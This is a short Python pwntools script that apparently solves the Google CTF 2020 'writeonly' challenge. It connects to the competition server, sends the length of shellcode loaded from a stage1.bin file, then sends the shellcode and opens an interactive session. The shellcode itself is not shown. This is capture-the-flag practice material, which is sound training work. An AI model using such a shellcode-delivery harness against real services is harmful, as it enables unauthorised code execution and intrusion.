from pwn import *


io = remote('writeonly.2020.ctfcompetition.com', 1337)

with open("stage1.bin", "rb") as f:
    shellcode = f.read()

io.recvuntil('shellcode length?')
io.sendline(b'%d' % len(shellcode))
io.recvuntil(b'of shellcode.')
io.send(shellcode)

io.interactive()
